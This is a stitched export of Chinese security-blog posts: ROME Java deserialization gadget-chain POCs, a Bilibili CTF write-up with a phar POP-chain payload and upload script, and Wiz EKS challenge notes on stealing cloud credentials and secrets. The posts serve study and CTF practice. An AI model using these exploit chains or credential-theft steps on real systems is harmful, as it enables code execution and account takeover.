所以POC也只需要把EqualsBean的改一下就好了： 12345678910111213141516public static void main(String[] args) throws Exception { TemplatesImpl templates = new TemplatesImpl(); byte[] bytes = Files.readAllBytes(Paths.get(&quot;savedir\\\\shell.class&quot;)); setValue(templates,&quot;_name&quot;,&quot;aaa&quot;); setValue(templates,&quot;_bytecodes&quot;,new byte[][]{bytes}); setValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl()); ToStringBean toStringBean = new ToStringBean(Templates.class,new ConstantTransformer(1)); EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean); HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(equalsBean,&quot;123&quot;); setValue(toStringBean,&quot;_obj&quot;,templates); serialize(hashMap); unserialize(&quot;ser.bin&quot;);} HashTable前面都是HashMap的hashCode()入口来调用到Java Bean对象中的方法，从而导致后面的任意类加载，如果HashMap被禁用了之后，是否还有替代品呢？答案是有的，那就是HashTable。在HashTable的readObject中调用了reconstitutionPut来对每一个键值对进行处理： 而在reconstitutionPut中就对key调用了hashCode，那么这里就接上了，如果key是EqualsBean或ObjectBean的话，那么整条链子也就能接上了。 POC如下： 12345678910111213141516171819public static void main(String[] args) throws Exception { TemplatesImpl templates = new TemplatesImpl(); byte[] bytes = Files.readAllBytes(Paths.get(&quot;D:\\\\ctf_tools\\\\java_study\\\\rome\\\\shell.class&quot;)); setValue(templates,&quot;_name&quot;,&quot;aaa&quot;); setValue(templates,&quot;_bytecodes&quot;,new byte[][]{bytes}); setValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl()); ToStringBean toStringBean = new ToStringBean(Templates.class,new ConstantTransformer(1));// EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean);//这里用EqualsBean也是可以的 ObjectBean objectBean = new ObjectBean(ToStringBean.class,toStringBean);// HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;();// hashMap.put(objectBean,&quot;123&quot;); Hashtable&lt;Object,Object&gt; hashtable = new Hashtable&lt;&gt;(); hashtable.put(objectBean,&quot;aaa&quot;); setValue(toStringBean,&quot;_obj&quot;,templates); serialize(hashtable); unserialize(&quot;ser.bin&quot;); } BadAttributeValueExpException前面TostringBean中要调用toString是通过hashCode来进行调用的，其实说到toString会让人想起CC5的BadAttributeValueExpException： 它在readObject的时候就会调用valObj.toString，valObj其实就是可控对象成员val，把它的值设为toStringBean岂不就成了。 POC如下： 12345678910111213141516public static void main(String[] args) throws Exception { TemplatesImpl templates = new TemplatesImpl(); byte[] bytes = Files.readAllBytes(Paths.get(&quot;savedir\\\\shell.class&quot;)); setValue(templates,&quot;_name&quot;,&quot;aaa&quot;); setValue(templates,&quot;_bytecodes&quot;,new byte[][]{bytes}); setValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl()); ToStringBean toStringBean = new ToStringBean(Templates.class,new ConstantTransformer(1)); BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(1); Field field = BadAttributeValueExpException.class.getDeclaredField(&quot;val&quot;); field.setAccessible(true); field.set(badAttributeValueExpException,toStringBean); setValue(toStringBean,&quot;_obj&quot;,templates); serialize(badAttributeValueExpException); unserialize(&quot;ser.bin&quot;);} HotSwappableTargetSource整条链子会稍微复杂一点，前面是CC6的HashMap之后是接了一段XString再触发ToStringBean的toString。首先是XString的equals，如果对比的变量是Object类型的话就会调用以下函数： 我们可以看到只要obj2不是null，其类型不是XNodeSet或XNumber的话，那么就会调用到obj2.toString，只要obj2是ToStringBean的话就可以接上后面的链子。而equals函数的调用可以看到springframework的HotSwappableTargetSource： 它的equal会调用成员变量target的equals方法。那么熟悉的就来了，HashMap的readObject会调用putVal从而触发equals，这样整条链子也就串起来了。 具体而言，HashMap的putVal是一个添加元素函数，在把键值对放入HashMap的时候会检查待插入元素是不是已有的内容，所以就会比较hash和key是否相同，在这个时候就会拿table中p结点的key（在代码中为k）和要插入的key做比较，调用的是后者的equals函数，前者作为参数输入。套到HotSwappableTargetSource的equals，k对应的就是other，key对应的就是this，在函数中this.target.equals(((HotSwappableTargetSource) other).target)，其实就是key.target.equals(k.target)，为了能够调用到前面XStrting的equals并触发任意类加载，那么k.target就必须得是ToStringBean类型，key.target就必须得是XString类型。那么带有ToStringBean的HotSwappableTargetSource对象实例应该先put到HashMap中，随后在把带有XString的HotSwappableTargetSource对象实例put进去。 POC如下： 12345678910111213141516171819//import org.springframework.aop.target.HotSwappableTargetSource; public static void main(String[] args) throws Exception { TemplatesImpl templates = new TemplatesImpl(); byte[] bytes = Files.readAllBytes(Paths.get(&quot;D:\\\\ctf_tools\\\\java_study\\\\rome\\\\shell.class&quot;)); setValue(templates,&quot;_name&quot;,&quot;aaa&quot;); setValue(templates,&quot;_bytecodes&quot;,new byte[][]{bytes}); setValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl()); ToStringBean toStringBean = new ToStringBean(Templates.class,new ConstantTransformer(1)); HotSwappableTargetSource h1 = new HotSwappableTargetSource(toStringBean); HotSwappableTargetSource h2 = new HotSwappableTargetSource(new XString(&quot;xxx&quot;)); HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(h1,&quot;h1&quot;); hashMap.put(h2,&quot;h2&quot;); setValue(toStringBean,&quot;_obj&quot;,templates); serialize(hashMap); unserialize(&quot;ser.bin&quot;); } JdbcRowSetImpl由最开始我们知道，ToStringBean的问题就处在了toString函数中回去遍历反射调用获取到的getter，而众所周知除了TemplatesImpl的getter方法getOutputProperties会触发任意类加载外，还有JdbcRowSetImpl的getter方法getDatabaseMetaData会触发JNDI注入: getDatabaseMetaData中调用的connect函数： 在connect中就会触发InitialContext的lookup，而dataSource是可控的，因此就可以通过RMI或者LDAP协议加载远程恶意类。 当然这个方法有一定的限制，那就是trustURLCodebase，目前有效的版本只有： RMI：JDK 6u132、JDK 7u122、JDK 8u113之前 LDAP：JDK 7u201、8u191、6u211、JDK 11.0.1之前 POC如下： 1234567891011121314//import com.sun.rowset.JdbcRowSetImpl;public static void main(String[] args) throws Exception { JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl(); jdbcRowSet.setDataSourceName(&quot;rmi://127.0.0.1:1099/Evil&quot;); ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class,new ConstantTransformer(1)); EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean); HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(equalsBean,&quot;123&quot;); setValue(toStringBean,&quot;_obj&quot;,jdbcRowSet); serialize(hashMap); unserialize(&quot;ser.bin&quot;); } 当然，这一段也可以和前面其他的片段进行拼接。 SignedObject由于ToStringBean.toString的getter循环获取及反射调用，导致可以去找能够到达sink的getter来进行利用，java.security.SignedObject就是第三个可以利用的点： 在getObject中，调用了readObject，内容则是来自可控的成员变量content，那么再次就可以造成二次序列化，将序列化之后的字节数组放入content中，在反序列化过程中就会再将content中的内容拿出来反序列化一次，这样就可以绕过反序列化入口处的黑名单限制。 那么我们就来看看SignedObject的构造函数： 只需要把我们要二次序列化的对象塞进去就可以了，它会自动帮我们进行序列化并转为字节数组，需要注意的是后面两个参数也要塞东西防止出错导致构造失败。 POC如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.syndication.feed.impl.EqualsBean;import com.sun.syndication.feed.impl.ToStringBean;import org.apache.commons.collections4.functors.ConstantTransformer;import java.security.interfaces.DSAParams;import java.security.interfaces.DSAPrivateKey;import java.security.*;import javax.xml.transform.Templates;import java.io.*;import java.math.BigInteger;import java.nio.file.Files;import java.nio.file.Paths;import java.lang.reflect.Field;import java.util.HashMap;public class SignedObjectTest { public static void main(String[] args) throws Exception { //二次反序列化的对象 TemplatesImpl templates = new TemplatesImpl(); byte[] bytes = Files.readAllBytes(Paths.get(&quot;D:\\\\ctf_tools\\\\java_study\\\\rome\\\\shell.class&quot;)); setValue(templates,&quot;_name&quot;,&quot;aaa&quot;); setValue(templates,&quot;_bytecodes&quot;,new byte[][]{bytes}); setValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl()); ToStringBean toStringBean = new ToStringBean(Templates.class,new ConstantTransformer(1)); EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean); HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(equalsBean,&quot;123&quot;); setValue(toStringBean,&quot;_obj&quot;,templates); //第一次反序列化的对象 SignedObject signedObject = makeSObj(hashMap); ToStringBean toStringBean1 = new ToStringBean(SignedObject.class,&quot;1&quot;); EqualsBean equalsBean1 = new EqualsBean(ToStringBean.class,toStringBean1); HashMap&lt;Object,Object&gt; hashMap1 = new HashMap&lt;&gt;(); hashMap1.put(equalsBean1,&quot;123&quot;); setValue(toStringBean1,&quot;_obj&quot;,signedObject); serialize(hashMap1); unserialize(&quot;ser.bin&quot;); } public static SignedObject makeSObj(Serializable o) throws IOException, InvalidKeyException, SignatureException{ return new SignedObject((Serializable) o, new DSAPrivateKey() { @Override public DSAParams getParams() { return null; } @Override public String getAlgorithm() { return null; } @Override public String getFormat() { return null; } @Override public byte[] getEncoded() { return new byte[0]; } @Override public BigInteger getX() { return null; } }, new Signature(&quot;1&quot;) { @Override protected void engineInitVerify(PublicKey publicKey) throws InvalidKeyException { } @Override protected void engineInitSign(PrivateKey privateKey) throws InvalidKeyException { } @Override protected void engineUpdate(byte b) throws SignatureException { } @Override protected void engineUpdate(byte[] b, int off, int len) throws SignatureException { } @Override protected byte[] engineSign() throws SignatureException { return new byte[0]; } @Override protected boolean engineVerify(byte[] sigBytes) throws SignatureException { return false; } @Override protected void engineSetParameter(String param, Object value) throws InvalidParameterException { } @Override protected Object engineGetParameter(String param) throws InvalidParameterException { return null; } } ); } private static void setValue(Object obj, String name, Object value) throws NoSuchFieldException, IllegalAccessException { Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj,value); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException,ClassNotFoundException{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; }} 不依赖ToStringBean可以看到，前面列出的诸多方法都是依赖于ToStringBean的toString方法对于getter的循环反射调用，那么如果可以有其他的类也存在这样的功能的话就可以代替它。这就不得不提到前面的EqualsBean了，它有一个beanEquals方法如下： 要求this._obj和obj的值不为null，而且_beanClass.isInstance(bean2)要为真，也就是bean2要属于_beanClass类或其子类，这是如果使用任意类加载的话就会出错，因为com.sun.org.apache.xalan.internal.xsltc.compiler.Template和com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl显然不满足条件，这里也就只能用SignedObject的二次反序列化了。之后就可以走到循环获取getter并反射调用的逻辑了，this._obj可以通过构造函数或者反射来进行赋值，而obj是传进来的参数，往回查一下调用情况，发现EqualsBean的equals调用了它，obj也是参数直接传进来的： 说到equals又回到了我们熟悉的话题，首先考虑HashMap在反序列化的时候会调用putVal，在putVal中调用key.equals(k)，按照HotSwappableTargetSource在构造方法最后就能调用到EqualsBean的beanEquals，但是这时候obj的类型会是EquslsBean，无法进入到getter的逻辑： 所以考虑另外一条路：Hashtable，他在readObject的时候会调用reconstitutionPut： e是从tag中来的，如果tag为空时就会传入key和value。如果tag不为空，就会先判断(e.hash == hash) &amp;&amp; e.key.equals(key)，这里可以利用哈希碰撞绕过哈希判断，之后就会调用e.key.equals(key)，而HashMap继承了AbstractMap，因此e.key.equals(key)就会调用到AbstractMap的equals： 在equals中会调用value.equals(m.get(key))，如果value为EqualsBean，m.get(key)为SignedObject，那么就可以触发二次反序列化了。 POC如下： 123456789101112131415161718192021222324252627282930313233343536public static void main(String[] args) throws Exception { //第二次反序列化的对象 TemplatesImpl templates = new TemplatesImpl(); byte[] bytes = Files.readAllBytes(Paths.get(&quot;D:\\\\ctf_tools\\\\java_study\\\\rome\\\\shell.class&quot;)); setValue(templates,&quot;_name&quot;,&quot;aaa&quot;); setValue(templates,&quot;_bytecodes&quot;,new byte[][]{bytes}); setValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl()); ToStringBean toStringBean = new ToStringBean(Templates.class,new ConstantTransformer(1)); EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean); HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(equalsBean,&quot;123&quot;); setValue(toStringBean,&quot;_obj&quot;,templates); //第一次反序列化的对象 SignedObject signedObject = makeSObj(hashMap); SignedObject signedObject1 = makeSObj(null); EqualsBean equalsBean1 = new EqualsBean(String.class,&quot;1&quot;); HashMap&lt;Object,Object&gt; hashMap1 = new HashMap&lt;&gt;(); hashMap1.put(&quot;yy&quot;,equalsBean1); hashMap1.put(&quot;zZ&quot;,signedObject); HashMap&lt;Object,Object&gt; hashMap2 = new HashMap&lt;&gt;(); hashMap2.put(&quot;zZ&quot;,equalsBean1); hashMap2.put(&quot;yy&quot;,signedObject); Hashtable hashtable = new Hashtable&lt;&gt;(); hashtable.put(hashMap1,&quot;a&quot;); hashtable.put(hashMap2,&quot;b&quot;); setValue(equalsBean1,&quot;_beanClass&quot;,SignedObject.class); setValue(equalsBean1,&quot;_obj&quot;,signedObject1); serialize(hashtable); unserialize(&quot;ser.bin&quot;);} 实验代码及调用链路图：https://github.com/hututu2/Java-Study 参考链接： https://goodapple.top/archives/1145 https://xz.aliyun.com/t/13104 https://xz.aliyun.com/t/12768","link":"/2024/04/01/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"title":"b站1024-2022-WP","text":"第二题打开题目看到提示upupup! 有可能是文件上传，访问一下upload.php，可以看到源码 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); date_default_timezone_set('PRC'); if($_SERVER['REQUEST_METHOD']==='POST') { $filename = $_FILES['file']['name']; $temp_name = $_FILES['file']['tmp_name']; $size = $_FILES['file']['size']; $error = $_FILES['file']['error']; if ($size &gt; 2*1024*1024){ echo &quot;&lt;script&gt;alert('文件过大');window.history.go(-1);&lt;/script&gt;&quot;; exit(); } $arr = pathinfo($filename); $ext_suffix = $arr['extension']; $allow_suffix = array('jpg','gif','jpeg','png'); if(!in_array($ext_suffix, $allow_suffix)){ echo &quot;&lt;script&gt;alert('只能是jpg,gif,jpeg,png');window.history.go(-1);&lt;/script&gt;&quot;; exit(); } $new_filename = date('YmdHis',time()).rand(100,1000).'.'.$ext_suffix; move_uploaded_file($temp_name, 'upload/'.$new_filename); echo &quot;success save in: &quot;.'upload/'.$new_filename; } else if ($_SERVER['REQUEST_METHOD']==='GET') { if (isset($_GET['c'])){ include(&quot;5d47c5d8a6299792.php&quot;); $fpath = $_GET['c']; if(file_exists($fpath)){ echo &quot;file exists&quot;; } else { echo &quot;file not exists&quot;; } } else { highlight_file(__FILE__); } } echo 111; ?&gt; 用POST方法是上传文件，而且只能上传文件名后缀为jpg,gif,jpeg,png的文件；用GET方法则是检查文件是否存在。再看一下5d47c5d8a6299792.php文件，也给出了源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100 &lt;?php// flag in /tmp/flag.php class Modifier { public function __invoke(){ include(&quot;index.php&quot;); }}class Action { protected $checkAccess; protected $id; public function run() { if(strpos($this-&gt;checkAccess, 'upload') !== false || strpos($this-&gt;checkAccess, 'log') !== false){ echo &quot;error path&quot;; exit(); } if ($this-&gt;id !== 0 &amp;&amp; $this-&gt;id !== 1) { switch($this-&gt;id) { case 0: if ($this-&gt;checkAccess) { include($this-&gt;checkAccess); } break; case 1: throw new Exception(&quot;id invalid in &quot;.__CLASS__.__FUNCTION__); break; default: break; } } }}class Content { public $formatters; public function getFormatter($formatter) { if (isset($this-&gt;formatters[$formatter])) { return $this-&gt;formatters[$formatter]; } foreach ($this-&gt;providers as $provider) { if (method_exists($provider, $formatter)) { $this-&gt;formatters[$formatter] = array($provider, $formatter); return $this-&gt;formatters[$formatter]; } } throw new \\InvalidArgumentException(sprintf('Unknown formatter &quot;%s&quot;', $formatter)); } public function __call($name, $arguments) { return call_user_func_array($this-&gt;getFormatter($name), $arguments); }}class Show{ public $source; public $str; public $reader; public function __construct($file='index.php') { $this-&gt;source = $file; echo 'Welcome to '.$this-&gt;source.&quot;&lt;br&gt;&quot;; } public function __toString() { $this-&gt;str-&gt;reset(); } public function __wakeup() { if(preg_match(&quot;/gopher|phar|http|file|ftp|dict|\\.\\./i&quot;, $this-&gt;source)) { throw new Exception('invalid protocol found in '.__CLASS__); } } public function reset() { if ($this-&gt;reader !== null) { $this-&gt;reader-&gt;close(); } }}highlight_file(__FILE__); 结合给出多个类、文件上传、文件存在检验可以猜测攻击路径大概是通过上传phar文件，再由文件存在性检查来触发给出的类的反序列化，从而读取flag。 通过分析以上几个类发现只有Action类的run函数能偶进行文件包含，这应该就是调用的目标函数，pop链最终就是要调用Action类的run函数执行include读取flag。而show函数具有__construct和__toString函数，且__construct函数中存在字符串输出操作，能够触发__toString函数，这应该是反序列化调用链的起点。而Content类存在__call函数，其中还调用了call_user_func_array()，因此这个类可以作为跳板，从Show跳到Action类。Show类的__toString函数中有$this-&gt;str-&gt;reset();，这个reset函数正是Content类所没有的，因此就会触发call_user_func_array函数调用Action的run函数，这样pop链就分析完成了。接下去就是一些细节的问题了： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586&lt;?php//目标是调用Action类的run函数，执行任意文件读取class Action { protected $checkAccess='php://filter/convert.base64-encode/resource=../../../tmp/flag.php'; //读取的目标文件 protected $id=NULL; public function run() { if(strpos($this-&gt;checkAccess, 'upload') !== false || strpos($this-&gt;checkAccess, 'log') !== false){ //这里限制了上传webshell，就只能采取文件读取的方式 echo &quot;error path&quot;; exit(); } if ($this-&gt;id !== 0 &amp;&amp; $this-&gt;id !== 1) {//switch的比较是'=='，可以利用语言特性绕过 switch($this-&gt;id) {//id=NULL即可 case 0: if ($this-&gt;checkAccess) {echo 'flag!!!!'; include($this-&gt;checkAccess); } break; case 1: throw new Exception(&quot;id invalid in &quot;.__CLASS__.__FUNCTION__); break; default: break; } } }}class Content { public $formatters;//设置为键值对，'reset'=&gt;array(new Action,'run') public function __construct(){ $action=new Action; $this-&gt;formatters=array('reset'=&gt;array($action,'run')); } public function getFormatter($formatter) { if (isset($this-&gt;formatters[$formatter])) { return $this-&gt;formatters[$formatter]; } foreach ($this-&gt;providers as $provider) { if (method_exists($provider, $formatter)) { $this-&gt;formatters[$formatter] = array($provider, $formatter); return $this-&gt;formatters[$formatter]; } } throw new \\InvalidArgumentException(sprintf('Unknown formatter &quot;%s&quot;', $formatter)); } public function __call($name, $arguments) { return call_user_func_array($this-&gt;getFormatter($name), $arguments);//调用 Action类 的 run函数 }}class Show{ public $source;//赋值为Show类实例 public $str;//赋值为Content类实例 public $reader; public function __construct($file='index.php') { $this-&gt;str=new Content; $this-&gt;source = $file; echo 'Welcome to '.$this-&gt;source.&quot;&lt;br&gt;&quot;; } public function __toString() { $this-&gt;str-&gt;reset(); }}//生成phar文件@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub$o = new Show();$o-&gt;source=new Show();$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering(); 上传phar文件后需要将其后缀改为jpg后再上传，以下是上传脚本： 12345678910111213import requestsfile1=open('phar.phar','rb')file2=open('phar.jpg','wb')file2.write(file1.read())file1.close()file2.close()url='http://42.192.54.239/upload.php'file={ &quot;file&quot;: open('./phar.jpg','rb'), }post=requests.post(url=url,files=file)print(post.content) 上传文件后能够拿到文件路径，再通过一下方式触发反序列化读取文件。 1http://42.192.54.239/upload.php?c=phar:///var/www/html/upload/20221026191443765.jpg 读取到的base64文件： 1LyoqCiAqIGJpbGliaWxpQDIwMjIuCiAqIENvbmdyYXR1bGF0aW9ucyEgVGhpcyBpcyBUaGUgRmxhZyEKICogQXV0aDogSzNpb3ZlQGdpdGh1YgogKiBSZXBvOiAxMDI0LWNoZWVycwogKiBAbGluayBodHRwczovL3NlY3VyaXR5LmJpbGliaWxpLmNvbS8KICogQGxpY2Vuc2UgaHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tLwogKi8KCmZsYWcye1BoQXJfVGhlX2JFc1RfTGFuZ30K 解码后即可得到flag： 123456789101112/** * bilibili@2022. * Congratulations! This is The Flag! * Auth: K3iove@github * Repo: 1024-cheers * @link https://security.bilibili.com/ * @license https://www.bilibili.com/ */flag2{PhAr_The_bEsT_Lang}","link":"/2022/10/31/b%E7%AB%991024-2022-WP/"},{"title":"Wiz EKS Challenge学习记录","text":"Wiz EKS Challenge第一关 Secret Seeker题目描述：Jumpstart your quest by listing all the secrets in the cluster. Can you spot the flag among them? EKS权限配置如下，可以对secrets进行列举和读取： 123456{ &quot;secrets&quot;: [ &quot;get&quot;, &quot;list&quot; ]} 根据提示是寻找集群中的secrets资源，通过kubectl get secrets 列出当前 命名空间（namespace） 下的所有 Secret，并使用命令kubectl get secret log-rotate -o jsonpath='{.data.flag}' | base64 --decode查看即可获得flag。 第二关 Registry Hunt题目描述： 12A thing we learned during our research: always check the container registries.For your convenience, the crane utility is already pre-installed on the machine. EKS配置如下，secrets仅可获取不可列举，pods可列举和读取 123456789{ &quot;secrets&quot;: [ &quot;get&quot; ], &quot;pods&quot;: [ &quot;list&quot;, &quot;get&quot; ]} 先看看有什么pods： 使用命令kubectl get pods database-pod-14f9769b -o yaml获取该pod的配置信息： 题目要求关注registry，Kubernetes容器注册表（Container Registry）是用于存储和管理Docker镜像的集中化存储库。它允许开发人员构建、保存和传输容器镜像，以供在Kubernetes集群中部署和运行。配置信息里面提到了image镜像地址和拉取进行的secret： 使用secret拉取对应的镜像： 先获取secret，解码得到登录index.docker.io/v1/的账号密码eksclustergames:dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo 登录认证crane auth login -u eksclustergames -p dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo index.docker.io crane pull eksclustergames/base_ext_image 1.tar tar -xvf 1.tar tar -xvf ce2d28790c34f433c7675ac64b6e9b9e1524ccdfb8d46eeded43000d832238a0.tar.gz cat flag.txt 第三关 Image Inquisition题目描述： 12A pod's image holds more than just code. Dive deep into its ECR repository, inspect the image layers, and uncover the hidden secret.Remember: You are running inside a compromised EKS pod. EKS配置： 123456{ &quot;pods&quot;: [ &quot;list&quot;, &quot;get&quot; ]} 提示是在AWS 的pod环境中，且要获得image去寻找secret。 通过获取pod的详细信息，可以看到存在image信息 但因为没有权限，无法获取： 因为是在AWS 的pod中，可以尝试通过有关接口获取凭据。元数据服务是一种提供查询运行中的实例内元数据的服务，在云场景下可以通过元数据进行临时凭证和其他信息的收集，在 AWS 下的元数据地址为：http://169.254.169.254/latest/meta-data或http://instance-data/latest/meta-data。此外如果目标配置 了IAM 角色，还可以通过访问元数据的 /iam/security-credentials/&lt;rolename&gt; 路径可以获得目标的临时凭证，进而接管目标服务器控制台账号权限。 这里获取到了aws sts临时凭据，可以使用cli工具来获取image的信息 先获取登录ECR的密码 随后进行登录 登录之后就可以查看镜像的内容了，在此之前需要先找到镜像名称，之后通过crane config查看镜像的信息，在运行记录中发现有flag 第四关 Pod Break题目描述： 123You're inside a vulnerable pod on an EKS cluster. Your pod's service-account has no permissions. Can you navigate your way to access the EKS Node's privileged service-account?Please be aware: Due to security considerations aimed at safeguarding the CTF infrastructure, the node has restricted permissions 权限设置为：{} 提示当前处于EKS集群中一个存在漏洞的pod中，需要获取node的权限来访问服务账户。 由于没有list或者get权限，先尝试收集凭据 获取到的是eks-challenge-cluster-nodegroup-NodeInstanceRole这个角色的凭据，而AWS的role命名有一个规则：&lt;cluster-name&gt;-nodegroup-NodeInstanceRole，因此可以知道cluster-name为eks-challenge-cluster，可以通过get-token来获取集群的凭据： 根据题目提示，这里就可以拿token来获取secret 在 Kubernetes 中，通过 kube-apiserver对集群进行访问，访问需要使用如ServiceAccount 令牌、客户端证书、基本身份验证（用户名和密码）、静态令牌文件等凭据来进行授权验证。AWS EKS使用了Webhook Token Authentication的身份验证，允许外部服务（AWS的EKS使用的是STS）对令牌进行身份验证，并返回与该令牌关联的用户信息。 使用 aws eks get-token命令AWS CLI 会调用 STS 的 GetCallerIdentity操作并获取一个带有签名的文档，这个带有签名的文档就是你的令牌。当你使用这个令牌与 EKS 集群通信时，EKS 集群会将这个令牌发送给 STS 进行验证，STS 会返回与这个令牌关联的用户信息，所以可以使用这个令牌直接管理集群。 第五关 Container Secrets Infrastructure题目描述： 1You've successfully transitioned from a limited Service Account to a Node Service Account! Great job. Your next challenge is to move from the EKS to the AWS account. Can you acquire the AWS role of the *s3access-sa* service account, and get the flag? 提示当前已经成功通过有限权限的服务账户获取到了节点服务账户，下一步是从EKS到AWS账户的获取，拿到s3access-sa账户的权限。 IAM策略为： 123456789101112131415161718{ &quot;Policy&quot;: { &quot;Statement&quot;: [ { &quot;Action&quot;: [ &quot;s3:GetObject&quot;, &quot;s3:ListBucket&quot; ], &quot;Effect&quot;: &quot;Allow&quot;, &quot;Resource&quot;: [ &quot;arn:aws:s3:::challenge-flag-bucket-3ff1ae2&quot;, &quot;arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag&quot; ] } ], &quot;Version&quot;: &quot;2012-10-17&quot; }} 允许的操作： **s3:GetObject**：读取对象的内容（下载文件）。 **s3:ListBucket**：列出存储桶中的对象（相当于查看目录列表）。 限制作用的资源： arn:aws:s3:::challenge-flag-bucket-3ff1ae2 → 代表整个 S3 存储桶。 arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag → 代表桶里特定的对象 flag。 这个策略允许： 列出 challenge-flag-bucket-3ff1ae2 桶中的对象（但不一定能访问所有对象）。 读取桶里特定的 flag 文件。 也就是说，用户能看到桶里的对象清单，并且可以 下载 flag 文件，但并不能随意访问桶里其他文件（除非也被明确授予 s3:GetObject 权限）。 Trust策略为： 1234567891011121314151617{ &quot;Version&quot;: &quot;2012-10-17&quot;, &quot;Statement&quot;: [ { &quot;Effect&quot;: &quot;Allow&quot;, &quot;Principal&quot;: { &quot;Federated&quot;: &quot;arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589&quot; }, &quot;Action&quot;: &quot;sts:AssumeRoleWithWebIdentity&quot;, &quot;Condition&quot;: { &quot;StringEquals&quot;: { &quot;oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589:aud&quot;: &quot;sts.amazonaws.com&quot; } } } ]} Principal指定了一个 Federated（联合身份）主体：这是你在账号 688655246681 中创建的 EKS OIDC 提供方（IRSA 用到的那个 OIDC Provider）。也就是说：来自这个 OIDC Provider 签发的 Web Identity Token（来自你的 EKS 集群）可以来扮演该角色。 Action说明允许通过 STS 的 AssumeRoleWithWebIdentity API 进行代入（典型 IRSA 流程）。 Condition要求来自该 OIDC 的令牌中，aud（Audience）必须是 sts.amazonaws.com，这是 IRSA 的标准校验之一，确保该令牌是面向 STS 使用的，而非其他受众。 pod权限为： 1234567891011121314151617{ &quot;secrets&quot;: [ &quot;get&quot;, &quot;list&quot; ], &quot;serviceaccounts&quot;: [ &quot;get&quot;, &quot;list&quot; ], &quot;pods&quot;: [ &quot;get&quot;, &quot;list&quot; ], &quot;serviceaccounts/token&quot;: [ &quot;create&quot; ]} **secrets: [&quot;get&quot;,&quot;list&quot;]**：允许读取并列出命名空间内的 Secret。拿到 Secret 往往就等于能拿到数据库密码、云凭证、Docker registry token、TLS 私钥等，具备横向&amp;向外部升级的可能。 **serviceaccounts: [&quot;get&quot;,&quot;list&quot;]**：允许查看并列出 ServiceAccount（SA）对象（名称、注解、挂载的 secret 引用等）。这为后续“挑选目标 SA”提供信息。 **pods: [&quot;get&quot;,&quot;list&quot;]**： 允许查看并列出 Pod（包含它运行所用的 serviceAccountName、挂载卷、镜像、环境变量）。这能帮助识别“更高权限的 SA 在哪些 Pod 上使用”。 serviceaccounts/token: [&quot;create&quot;]（子资源）： 允许调用 TokenRequest API 为某个 ServiceAccount 签发短期 JWT 令牌（Bound Service Account Token）， 这张 token 可直接作为 Bearer Token 调 K8s API，拥有该 SA 的全部权限。 由IAM的策略可知，flag位于arn:aws:s3:::challenge-flag-bucket-3ff1ae2存储桶中，我们需要获取相关IAM权限才能够获得flag。 通过get可以看到没有pods和secrets资源，但是有三个sa： s3access-sa这个账户的角色拥有S3Role字段，可能拥有对flag的读取权限，所以目标是获取s3access-sa的相关凭据。 Trust策略中提到允许OIDC来通过sts扮演角色，Condition要求来自该 OIDC 的令牌中，aud（Audience）必须是 sts.amazonaws.com，但并没有更细致的划分，即没有对subject进行检查，这就可能导致了身份扮演滥用的风险。 kubectl create token可以创建一个新的身份验证令牌，并将其分配给指定的用户或服务账号。这样，用户或服务账号就可以使用该令牌来进行身份验证，并获得相应的权限来执行操作。 